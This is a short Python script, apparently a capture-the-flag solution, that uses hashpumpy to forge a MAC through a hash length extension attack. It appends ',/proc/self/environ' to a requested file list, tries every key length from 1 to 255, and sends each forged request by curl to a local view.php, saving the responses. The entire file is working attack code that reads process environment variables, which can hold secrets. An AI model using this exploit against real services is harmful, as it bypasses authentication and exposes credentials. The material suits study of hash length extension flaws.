#!/usr/bin/env python

import hashpumpy
import os

#file = str(',' + raw_input('> '))
file = ',/proc/self/environ';

for i in range(1,256):
	new_hash, msg = hashpumpy.hashpump('48b49f65a86cd617e5c7423d23a67738c4057d06','filelocation,list.txt', file ,i)
	hexfile = msg.encode('hex')

	num1 = 0
	num2 = 0
	for i in new_hash:
		num1 += ord(i)
	for i in hexfile:
		num2 += ord(i)

	magic = num1 * num2 - num1 - num2
	'''
	print 'Magic:', magic
	print 'File:', hexfile
	print 'Hash:', new_hash
	'''
	os.system('curl localhost:17565/view.php --data "magic={}&file={}&mac={}" >> data'.format(magic,hexfile,new_hash))
